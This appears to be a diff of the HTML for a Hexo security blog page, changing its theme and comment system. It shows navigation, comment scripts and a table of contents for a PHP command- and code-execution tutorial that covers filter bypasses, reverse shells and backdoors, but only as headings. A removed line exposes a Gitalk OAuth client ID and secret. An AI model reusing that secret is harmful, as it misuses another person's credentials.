+                            <a href="/tags/Web/">#Web</a>&nbsp;
+                        </li>
                     
-                        
-                            <li title="1" data-url="http://link.hhtjim.com/163/425570952.mp3"></li>
-                        
+                        <li class="tag-item">
+                            <a href="/tags/Study/">#Study</a>&nbsp;
+                        </li>
+                    
+                        <li class="tag-item">
+                            <a href="/tags/PHP/">#PHP</a>&nbsp;
+                        </li>
                     
                 </ul>
             
+
+            
+                <div class="article-nav">
+                    
+                        <div class="article-prev">
+                            <a class="prev"
+                               rel="prev"
+                               href="/2022/09/10/web_3/"
+                            >
+                            <span class="left arrow-icon flex-center">
+                              <i class="fas fa-chevron-left"></i>
+                            </span>
+                                <span class="title flex-center">
+                                <span class="post-nav-title-item">Web_3_PHP文件包含</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                            </a>
+                        </div>
+                    
+                    
+                        <div class="article-next">
+                            <a class="next"
+                               rel="next"
+                               href="/2022/09/02/web_1/"
+                            >
+                            <span class="title flex-center">
+                                <span class="post-nav-title-item">Web_1_简单信息搜集+burp基本使用</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                                <span class="right arrow-icon flex-center">
+                              <i class="fas fa-chevron-right"></i>
+                            </span>
+                            </a>
+                        </div>
+                    
+                </div>
+            
+
+            
+                <div class="comment-container">
+                    
+<div class="comments-container">
+    <div id="comments-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fas fa-comments"></i>&nbsp;Comments
+    </div>
+    
+        
+            
+
+    <div class="waline-comment-container">
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.css"/>
+        <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline-meta.css"/>
+        <script data-pjax src="//cdn.jsdelivr.net/npm/@waline/client@v2/dist/waline.js"></script>
+        <div id="waline-comment"></div>
+        <script data-pjax>
+          function loadWaline() {
+            Waline.init({
+              el: '#waline-comment',
+              serverURL: 'https://lsvf4zhg.api.lncldglobal.com',
+              lang: 'en' || 'zh-CN',
+              comment: '.post-comments-count',
+              reaction: 'true' === 'true'
+            })
+          }
+
+          if ('true' === 'true') {
+            setTimeout(() => {
+              loadWaline()
+            }, 1000)
+          } else {
+            window.addEventListener('DOMContentLoaded', loadWaline)
+          }
+        </script>
+    </div>
+
+
+
+        
+    
+</div>
+
+                </div>
+            
+        </div>
+
+        
+            <div class="toc-content-container">
+                <div class="post-toc-wrap">
+    <div class="post-toc">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%80%E8%8A%82-php%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-text">第一节 php的基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-php%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="nav-text">0x1 php的基本概念</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-php%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E8%A3%85"><span class="nav-text">0x2 php环境的安装</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#php-%E7%9A%84%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="nav-text">php 的运行环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php-%E7%9A%84%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83"><span class="nav-text">php 的开发环境</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-php%E5%86%99%E4%B8%80%E4%B8%AAhello-world"><span class="nav-text">0x3 php写一个hello world</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-php%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="nav-text">0x3 php基础语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#GET"><span class="nav-text">$_GET</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#POST"><span class="nav-text">$_POST</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#REQUEST"><span class="nav-text">$_REQUEST</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0"><span class="nav-text">函数</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="nav-text">危险函数</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%BA%8C%E8%8A%82-php%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">第二节 php的命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">0x1 什么是命令执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-php%E7%9A%84command-exec%E5%87%BD%E6%95%B0"><span class="nav-text">0x2 php的command exec函数</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-php%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="nav-text">0x3 php的命令执行利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%BB%95%E8%BF%87"><span class="nav-text">绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">base64编码绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97"><span class="nav-text">变量拼接绕过关键字</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E7%88%86%E7%A0%B4%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E7%AC%A6%E5%8F%B7"><span class="nav-text">爆破被过滤的符号</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8D%E5%9B%9E%E6%98%BE"><span class="nav-text">不回显</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="nav-text">写入文件</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#dns%E9%80%9A%E9%81%93"><span class="nav-text">dns通道</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="nav-text">时间盲注</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%AC%AC%E4%B8%89%E8%8A%82-php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">第三节 php的代码执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x1-%E4%BB%80%E4%B9%88%E6%98%AFphp%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">0x1 什么是php的代码执行</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x2-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="nav-text">0x2 代码执行和命令执行的区别</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x3-php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%98%AF%E4%BB%80%E4%B9%88%E6%A0%BC%E5%BC%8F"><span class="nav-text">0x3 php的代码执行是什么格式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x4-php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%90%8E%E9%97%A8"><span class="nav-text">0x4 php的代码执行后门</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="nav-text">0x5 代码执行的类型</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%83%A7%E5%A7%BF%E5%8A%BF"><span class="nav-text">烧姿势</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-text">1.无字母数字命令执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="nav-text">2.无字母数字代码执行</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-%E5%B7%A7%E7%94%A8%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E5%BD%93%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90"><span class="nav-text">3.巧用蚁剑插件当脚本小子</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#4-%E8%9A%81%E5%89%91%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="nav-text">4.蚁剑操作数据库</span></a></li></ol></li></ol></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+
+        </div>
+
+        <div class="page-main-content-bottom">
+            
+<footer class="footer">
+    <div class="info-container">
+        <div class="copyright-info info-item">
+            &copy;
+            
+                <span>2022.04.28</span> -
+            
+            2023
+            
+                &nbsp;<i class="fas fa-heart icon-animate"></i>
+                &nbsp;<a href="/">Charmersix</a>
+            
         </div>
         
-    <div id="gitalk-container" class="comment link"
-		data-enable="true"
-        data-ae="false"
-        data-ci="f71ceda7a670da0dc3de"
-        data-cs="8be3f3262b0ceccee081194200fa10dca1224f03"
-        data-r="blog_comments"
-        data-o="Charmersix"
-        data-a="Charmersix"
-        data-d="false"
-    >查看评论</div>
-
-
+            <script async data-pjax
+                    src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="website-count info-item">
+                
+                    Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
+                
+                
+                    Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
+                
+            </div>
+        
+        <div class="theme-info info-item">
+            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.6.1</a>
+        </div>
+        
+        
     </div>
+</footer>
+
+        </div>
+    </div>
+
     
-        <div class="side">
-			<ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%80%E8%8A%82-php%E7%9A%84%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">第一节 php的基础知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-php%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">1.1.</span> <span class="toc-text">0x1 php的基本概念</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-php%E7%8E%AF%E5%A2%83%E7%9A%84%E5%AE%89%E8%A3%85"><span class="toc-number">1.2.</span> <span class="toc-text">0x2 php环境的安装</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#php-%E7%9A%84%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.1.</span> <span class="toc-text">php 的运行环境</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#php-%E7%9A%84%E5%BC%80%E5%8F%91%E7%8E%AF%E5%A2%83"><span class="toc-number">1.2.2.</span> <span class="toc-text">php 的开发环境</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-php%E5%86%99%E4%B8%80%E4%B8%AAhello-world"><span class="toc-number">1.3.</span> <span class="toc-text">0x3 php写一个hello world</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-php%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95"><span class="toc-number">1.4.</span> <span class="toc-text">0x3 php基础语法</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#GET"><span class="toc-number">1.4.1.</span> <span class="toc-text">$_GET</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#POST"><span class="toc-number">1.4.2.</span> <span class="toc-text">$_POST</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#REQUEST"><span class="toc-number">1.4.3.</span> <span class="toc-text">$_REQUEST</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.4.</span> <span class="toc-text">函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%B1%E9%99%A9%E5%87%BD%E6%95%B0"><span class="toc-number">1.4.5.</span> <span class="toc-text">危险函数</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%BA%8C%E8%8A%82-php%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.</span> <span class="toc-text">第二节 php的命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-%E4%BB%80%E4%B9%88%E6%98%AF%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">2.1.</span> <span class="toc-text">0x1 什么是命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-php%E7%9A%84command-exec%E5%87%BD%E6%95%B0"><span class="toc-number">2.2.</span> <span class="toc-text">0x2 php的command exec函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-php%E7%9A%84%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%A9%E7%94%A8"><span class="toc-number">2.3.</span> <span class="toc-text">0x3 php的命令执行利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.1.</span> <span class="toc-text">绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#base64%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="toc-number">2.3.1.1.</span> <span class="toc-text">base64编码绕过</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E6%8B%BC%E6%8E%A5%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E5%AD%97"><span class="toc-number">2.3.1.2.</span> <span class="toc-text">变量拼接绕过关键字</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%88%86%E7%A0%B4%E8%A2%AB%E8%BF%87%E6%BB%A4%E7%9A%84%E7%AC%A6%E5%8F%B7"><span class="toc-number">2.3.1.3.</span> <span class="toc-text">爆破被过滤的符号</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%B8%8D%E5%9B%9E%E6%98%BE"><span class="toc-number">2.3.2.</span> <span class="toc-text">不回显</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6"><span class="toc-number">2.3.2.1.</span> <span class="toc-text">写入文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#dns%E9%80%9A%E9%81%93"><span class="toc-number">2.3.2.2.</span> <span class="toc-text">dns通道</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="toc-number">2.3.2.3.</span> <span class="toc-text">反弹shell</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.2.4.</span> <span class="toc-text">时间盲注</span></a></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AC%AC%E4%B8%89%E8%8A%82-php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">3.</span> <span class="toc-text">第三节 php的代码执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x1-%E4%BB%80%E4%B9%88%E6%98%AFphp%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">3.1.</span> <span class="toc-text">0x1 什么是php的代码执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x2-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%92%8C%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%9A%84%E5%8C%BA%E5%88%AB"><span class="toc-number">3.2.</span> <span class="toc-text">0x2 代码执行和命令执行的区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x3-php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%98%AF%E4%BB%80%E4%B9%88%E6%A0%BC%E5%BC%8F"><span class="toc-number">3.3.</span> <span class="toc-text">0x3 php的代码执行是什么格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x4-php%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E5%90%8E%E9%97%A8"><span class="toc-number">3.4.</span> <span class="toc-text">0x4 php的代码执行后门</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x5-%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E7%9A%84%E7%B1%BB%E5%9E%8B"><span class="toc-number">3.5.</span> <span class="toc-text">0x5 代码执行的类型</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%83%A7%E5%A7%BF%E5%8A%BF"><span class="toc-number">4.</span> <span class="toc-text">烧姿势</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">4.0.1.</span> <span class="toc-text">1.无字母数字命令执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-%E6%97%A0%E5%AD%97%E6%AF%8D%E6%95%B0%E5%AD%97%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C"><span class="toc-number">4.0.2.</span> <span class="toc-text">2.无字母数字代码执行</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-%E5%B7%A7%E7%94%A8%E8%9A%81%E5%89%91%E6%8F%92%E4%BB%B6%E5%BD%93%E8%84%9A%E6%9C%AC%E5%B0%8F%E5%AD%90"><span class="toc-number">4.0.3.</span> <span class="toc-text">3.巧用蚁剑插件当脚本小子</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-%E8%9A%81%E5%89%91%E6%93%8D%E4%BD%9C%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">4.0.4.</span> <span class="toc-text">4.蚁剑操作数据库</span></a></li></ol></li></ol></li></ol>	
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="tools-item flex-center go-to-comments">
+                <i class="fas fa-comment"></i>
+                <span class="post-comments-count"></span>
+            </li>
+        
+    </ul>
+</div>
+
         </div>
     
-</div>
 
+    <div class="right-bottom-side-tools">
+        <div class="side-tools-container">
+    <ul class="side-tools-list">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <li class="tools-item tool-dark-light-toggle flex-center">
+            <i class="fas fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list">
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="tools-item tool-scroll-to-top flex-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+    </ul>
+</div>
 
     </div>
+
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
 </div>
+
+
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+</main>
+
+
+
+<script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/utils.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/main.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/header-shrink.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/back2top.js"></script><script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/dark-light-toggle.js"></script>
+
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/local-search.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/code-block.js"></script>
+
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/lazyload.js"></script>
+
+
+<div class="post-scripts pjax">
+    
+        <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/post-helper.js"></script>
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/anime.min.js"></script>
+        
+        
+            <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/toc.js"></script>
+        
+    
+</div>
+
+
+    <script src="//cdn.jsdelivr.net/npm/hexo-theme-keep@3.6.1/source/js/libs/pjax.min.js"></script>
+<script>
+    window.addEventListener('DOMContentLoaded', () => {
+        window.pjax = new Pjax({
+            selectors: [
+                'head title',
+                '.page-container',
+                '.pjax'
+            ],
+            history: true,
+            debug: false,
+            cacheBust: false,
+            timeout: 0,
+            analytics: false,
+            currentUrlFullReload: false,
+            scrollRestoration: false,
+            // scrollTo: true,
+        });
+
+        document.addEventListener('pjax:send', () => {
+            KEEP.utils.pjaxProgressBarStart();
+        });
+
+        document.addEventListener('pjax:complete', () => {
+            KEEP.utils.pjaxProgressBarEnd();
+            window.pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+            KEEP.refresh();
+        });
+    });
+</script>
+
+
+
 </body>
-
-<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
-
-
-<script src="//lib.baomitu.com/jquery/1.8.3/jquery.min.js"></script>
-<script src="/js/plugin.js"></script>
-<script src="/js/typed.js"></script>
-<script src="/js/diaspora.js"></script>
-
-
-<link rel="stylesheet" href="/photoswipe/photoswipe.css">
-<link rel="stylesheet" href="/photoswipe/default-skin/default-skin.css">
-
-
-<script src="/photoswipe/photoswipe.min.js"></script>
-<script src="/photoswipe/photoswipe-ui-default.min.js"></script>
-
-
-<!-- Root element of PhotoSwipe. Must have class pswp. -->
-<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
-    <!-- Background of PhotoSwipe. 
-         It's a separate element as animating opacity is faster than rgba(). -->
-    <div class="pswp__bg"></div>
-    <!-- Slides wrapper with overflow:hidden. -->
-    <div class="pswp__scroll-wrap">
-        <!-- Container that holds slides. 
-            PhotoSwipe keeps only 3 of them in the DOM to save memory.
-            Don't modify these 3 pswp__item elements, data is added later on. -->
-        <div class="pswp__container">
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-            <div class="pswp__item"></div>
-        </div>
-        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
-        <div class="pswp__ui pswp__ui--hidden">
-            <div class="pswp__top-bar">
-                <!--  Controls are self-explanatory. Order can be changed. -->
-                <div class="pswp__counter"></div>
-                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
-                <button class="pswp__button pswp__button--share" title="Share"></button>
-                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
-                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
-                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
-                <!-- element will get class pswp__preloader--active when preloader is running -->
-                <div class="pswp__preloader">
-                    <div class="pswp__preloader__icn">
-                      <div class="pswp__preloader__cut">
-                        <div class="pswp__preloader__donut"></div>
-                      </div>
-                    </div>
-                </div>
-            </div>
-            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
-                <div class="pswp__share-tooltip"></div> 
-            </div>
-            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
-            </button>
-            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
-            </button>
-            <div class="pswp__caption">
-                <div class="pswp__caption__center"></div>
-            </div>
-        </div>
-    </div>
-</div>
-
-
-
-
-
-
 </html>
